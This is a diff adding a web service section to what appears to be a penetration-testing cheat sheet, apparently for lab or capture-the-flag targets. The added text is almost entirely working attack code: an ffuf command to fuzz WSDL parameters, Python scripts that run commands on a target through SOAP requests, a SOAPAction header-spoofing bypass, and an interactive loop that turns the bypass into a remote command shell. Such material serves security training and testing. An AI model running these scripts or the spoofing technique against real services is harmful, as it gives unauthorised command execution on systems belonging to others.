@@ -1842,6 +1842,56 @@ http://oredirect.htb.net/?redirect_uri=http://<IP address>:<port>&token=<RANDOM 
 #27. - Web Service/API
 -----------------------------------------
 
+- Web Services Description Language (WSDL) Fuzzing
+
+```
+$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<IP address>:3002/wsdl?FUZZ' -fs 0 -mc 200
+curl http://<IP address>:3002/wsdl?wsdl 
+```
+
+- SOAPAction Command Execution
+
+```
+# Save to client.py
+
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<IP address>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+
+$ python3 client.py
+```
+
+- SOAPAction Spoofing Command Execution
+
+```
+# Save to client_soapaction_spoofing.py
+
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<IP address>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+
+$ python3 client_soapaction_spoofing.py
+```
+
+- SOAPAction Spoofing Command Execution Automation
+
+```
+# Save to automate.py
+
+import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
+    print(requests.post("http://<IP address>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+
+$ python3 automate.py
+```
+
 #28. - WordPress
 -----------------------------------------
 
